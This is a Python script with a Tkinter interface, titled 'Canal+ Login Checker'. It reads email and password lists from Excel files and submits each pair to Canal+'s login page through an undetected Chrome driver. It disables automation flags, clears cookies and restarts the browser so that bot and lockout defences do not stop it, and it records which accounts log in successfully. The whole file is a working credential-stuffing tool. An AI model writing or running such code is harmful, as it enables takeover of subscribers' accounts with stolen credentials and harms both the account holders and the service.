import time
import tkinter as tk
from tkinter import filedialog, messagebox
import undetected_chromedriver as uc  
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import pandas as pd
import psutil  
import threading  
from tkinter import ttk  
import os  
import pyautogui  
import shutil
import gc 

def kill_chrome():
    """Kill any running Chrome processes to avoid conflicts."""
    for process in psutil.process_iter(attrs=['pid', 'name']):
        if "chrome" in process.info['name'].lower():
            try:
                psutil.Process(process.info['pid']).terminate()
            except psutil.NoSuchProcess:
                pass  

kill_chrome()  

# Global variables
driver = None  
login_attempts = 0  

def clear_chrome_profile_data():
    """Deletes Chrome profile data (cache, cookies, history) but keeps the profile itself."""
    profile_name = "Profile 2"  
    chrome_profile_path = os.path.expandvars(r"C:\Users\Baigm\AppData\Local\Google\Chrome\User Data")
    profile_path = os.path.join(chrome_profile_path, profile_name)

    if not os.path.exists(profile_path):
        return  

    folders_to_delete = [
        "Cache", "Code Cache", "GPUCache", "Service Worker", "Session Storage",
        "Local Storage", "IndexedDB", "Storage", "File System"
    ]
    files_to_delete = ["Cookies", "History"]

    for folder in folders_to_delete:
        folder_path = os.path.join(profile_path, folder)
        if os.path.exists(folder_path):
            shutil.rmtree(folder_path, ignore_errors=True)

    for file in files_to_delete:
        file_path = os.path.join(profile_path, file)
        if os.path.exists(file_path):
            os.remove(file_path)


def initialize_driver():
    """Initialize a new Chrome driver safely."""
    global driver, login_attempts
    try:
        close_driver()  

        chrome_profile_path = "C:\\Users\\Baigm\\AppData\\Local\\Google\\Chrome\\User Data"
        options = uc.ChromeOptions()
        options.add_argument(f"--user-data-dir={chrome_profile_path}")  
        options.add_argument("--profile-directory=Profile 2")  
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")
        options.add_argument("--disable-blink-features=AutomationControlled")
        # options.add_argument("--headless")
        options.add_argument("--incognito") 
        driver = uc.Chrome(options=options)
        

        driver.get("https://pass.canalplus.com/oauth2/default/v1/authorize?client_id=0oa7mop7kI79jDOCA416&redirect_uri=https%3A%2F%2Fpass.canal-plus.com%2Fprovider%2Foauth2sp%2Fauth%2FCPOKT&response_type=code&scope=profile+openid+email+address+phone+offline_access&login_hint=&state=redirect_uri%3Dhttps%253A%252F%252Fwww.canalplus.com%252F%26platform%3Dweb&code_challenge=w_ZInSZt5Ioc0kXMmd2Im7d972JTEwKBF2EARfKk-lA&code_challenge_method=S256")


        error_thread = threading.Thread(target=watch_for_error_modal, daemon=True)
        error_thread.start()

        if "https://pass.canal-plus.com/provider/oauth2sp/auth/CPOKT" in driver.current_url:
            print("🚨 Unwanted redirect detected! Restarting Chrome...")
            close_driver()
            time.sleep(3)
            clear_chrome_profile_data()
            time.sleep(3)
            initialize_driver()  # Restart Chrome
            

    except Exception as e:
        print(f"Error initializing Chrome: {e}")

def close_driver():
    """Safely close Chrome without terminating the main application."""
    global driver
    try:
        if driver:
            driver.quit()  
            # driver.service.stop() 
            driver = None  
            time.sleep(3)  
    except Exception as e:
        print(f"Error closing Chrome: {e}")
        driver = None  # Ensure driver is reset if closing fails
    for process in psutil.process_iter(attrs=['pid', 'name']):
        if "chrome" in process.info['name'].lower():
            try:
                psutil.Process(process.info['pid']).terminate()
            except psutil.NoSuchProcess:
                pass  

import threading

def watch_for_error_modal():
    """Continuously watches for the error modal and clicks OK if detected."""
    global driver
    while True:
        try:
            if driver is not None:
                error_modal = driver.find_element(By.CLASS_NAME, "dialog-modal-error-content")
                if error_modal.is_displayed():
                    print("⚠️ Error modal detected! Closing it...")

                    # Click the OK button
                    ok_button = error_modal.find_element(By.XPATH, "//div[@class='ok-button']/input[@type='button']")
                    ok_button.click()

                    time.sleep(2)  # Allow time for the modal to close
        except:
            pass  # No modal found, continue checking

        time.sleep(1)  # Avoid excessive CPU usage


def is_blocked_page():
    """Check if the account is blocked."""
    global driver
    try:
        blocked_element = WebDriverWait(driver, 3).until(EC.presence_of_element_located((By.CLASS_NAME, "okta-form-title")))
        blocked_text = blocked_element.text.lower()
        if "locked" in blocked_text or "blocked" in blocked_text or "verify" in blocked_text:
            return True  
        return False
    except:
        return False  

def is_login_page_loaded():
    """Check if the login page has loaded properly."""
    global driver
    try:
        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, "input28")))
        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, "input36")))
        return True  
    except:
        return False  

def login_check(email, password):
    """Attempt to log in with given credentials safely."""
    global driver, login_attempts
    if driver is None:
        initialize_driver()

    wait = WebDriverWait(driver, 15)
    email = str(email)
    password = str(password)
    retries = 0
    while not is_login_page_loaded():
        if retries >= 3:
            return False
        driver.refresh()
        time.sleep(5)
        retries += 1

        if is_blocked_page():
            print(f"❌ Blocked Account Detected: {email} - Restarting Chrome!")
            close_driver()  
            time.sleep(3)  
            initialize_driver()  
            return "blocked"  

        if "pass.canalplus.com" not in driver.current_url:  
            close_driver()  
            time.sleep(5)
            initialize_driver()  
        
            return True  

    attempt = 0  # Track retry attempts

    while True:  # Keep retrying until a valid, invalid, or blocked response is received
        try:
            email_input = wait.until(EC.presence_of_element_located((By.ID, "input28")))
            email_input.clear()
            email_input.send_keys(email)
    
            password_input = wait.until(EC.presence_of_element_located((By.ID, "input36")))
            password_input.clear()
            password_input.send_keys(password)

            submit_button = wait.until(EC.element_to_be_clickable((By.XPATH, "//input[@type='submit']")))
            submit_button.click()
            time.sleep(5)

            # ✅ Check if error message for invalid credentials appears
            try:
                error_message = driver.find_element(By.ID, "error-message")
                if "Make sure that you have right password & e-mail" in error_message.text:
                    print(f"❌ Invalid credentials detected: {email}")
                    return False  # Treat as invalid login
            except:
                pass  # No error message found, continue checking

            # ✅ Check if account is blocked
            if is_blocked_page():
                print(f"🚫 Blocked Account: {email}")
                close_driver()
                time.sleep(3)
                initialize_driver()
                return "blocked"  
            # ✅ Check if URL changed (successful login)
            if "pass.canalplus.com" not in driver.current_url:
                print(f"✅ Valid Login Detected: {email}")
                close_driver()
                time.sleep(3)
                initialize_driver()
                return True  # Treat as valid login

            # If none of the conditions matched, retry the same credentials
            else: print(f"🔄 Retrying login for {email} (Attempt {attempt + 1})...")
            if attempt > 3 :
                driver.refresh()
                time.sleep(3)
                attempt = 1
            if "pass.canalplus.com" not in driver.current_url:
                print(f"✅ Valid Login Detected: {email}")
                close_driver()
                time.sleep(3)
                initialize_driver()
                return True  # Treat as valid login
            if is_blocked_page():
                print(f"🚫 Blocked Account: {email}")
                close_driver()
                time.sleep(3)
                initialize_driver()
                return "blocked"  
            
            time.sleep(3)
            attempt += 1

        except Exception as e:
            print(f"Error during login: {e}")

            # If session is invalid, reinitialize the driver
            if "invalid session id" in str(e).lower():
                print("⚠️ Invalid session detected, restarting driver...")
                initialize_driver()

            print(f"🔄 Retrying login for {email} due to error...")
            if "pass.canalplus.com" not in driver.current_url:
                print(f"✅ Valid Login Detected: {email}")
                close_driver()
                time.sleep(3)
                initialize_driver()
                return True  #
            if is_blocked_page():
                print(f"🚫 Blocked Account: {email}")
                close_driver()
                time.sleep(3)
                initialize_driver()
                return "blocked"   
            time.sleep(3)
            driver.refresh()
        time.sleep(5)

def process_file():
    """Process the selected Excel file and check login credentials safely."""
    file_path = filedialog.askopenfilename(filetypes=[("Excel Files", "*.xlsx")])
    if not file_path:
        return

    df = pd.read_excel(file_path, dtype=str)  # Read as string
    df = df.dropna(subset=["email", "password"])  # Remove empty rows
    df.fillna("", inplace=True)  # Replace NaN with empty string

    if "email" not in df.columns or "password" not in df.columns:
        messagebox.showerror("Error", "Excel file must contain 'email' and 'password' columns")
        return

    total_records = len(df)
    valid_count, invalid_count, blocked_count = 0, 0, 0  
    save_path = "valid_logins.xlsx"

    def check_credentials():
        global login_attempts
        nonlocal valid_count, invalid_count, blocked_count

        print(f"Total records to process: {total_records}")
        # start_index = get_last_progress()  # Read last saved index
        for idx, row in enumerate(df.itertuples(), start=1):  
            email, password = row.email, row.password
            print(f"🔍 Checking {idx}: {email}") 
            if idx % 100 == 0:
                print("🧹 Freeing up memory...")
                gc.collect()
                close_driver()
                time.sleep(3)  
                clear_chrome_profile_data()
                time.sleep(3)  
                initialize_driver()
                print("🧹 Clearing Chrome cache to prevent slowdown...")
                
            if login_attempts >= 30:
                print("🔄 Restarting Chrome after 30 requests...")
                close_driver()
                time.sleep(3)  
                initialize_driver()
                login_attempts = 0  

            result = login_check(email, password)
            login_attempts += 1  

            if login_attempts % 10 == 0 and login_attempts < 30:
                print("🔄 Refreshing Chrome after 15 requests...")
                driver.refresh()
                time.sleep(5)

            if result == True:
                valid_count += 1
                if os.path.exists(save_path):
                    existing_df = pd.read_excel(save_path)
                    valid_df = pd.concat([existing_df, pd.DataFrame([{ "email": email, "password": password }])], ignore_index=True)
                else:
                    valid_df = pd.DataFrame([{ "email": email, "password": password }])
                valid_df.to_excel(save_path, index=False)

            elif result == "blocked":
                blocked_count += 1

            else:
                invalid_count += 1

            email_status_label.config(text=f"✅ Valid: {valid_count} | ❌ Invalid: {invalid_count} | 🚫 Blocked: {blocked_count}")
            progress_label.config(text=f"Testing: {idx} out of {total_records} records")
            progress_bar['value'] = (idx) / total_records * 100
            root.update_idletasks()

            time.sleep(1)  

        messagebox.showinfo("Success", f"✅ Valid logins saved to {save_path}")
        progress_label.config(text="Testing Complete")
        progress_bar['value'] = 0

    threading.Thread(target=check_credentials).start()

root = tk.Tk()
root.title("Canal+ Login Checker")
root.geometry("400x350")

tk.Button(root, text="Select File", command=process_file).pack(pady=10)
email_status_label = tk.Label(root, text="✅ Valid: 0 | ❌ Invalid: 0 | 🚫 Blocked: 0")
email_status_label.pack(pady=5)
progress_label = tk.Label(root, text="Testing: 0 out of 0 records")
progress_label.pack(pady=10)
progress_bar = ttk.Progressbar(root, length=300, mode="determinate", maximum=100, value=0)
progress_bar.pack(pady=10)

root.mainloop()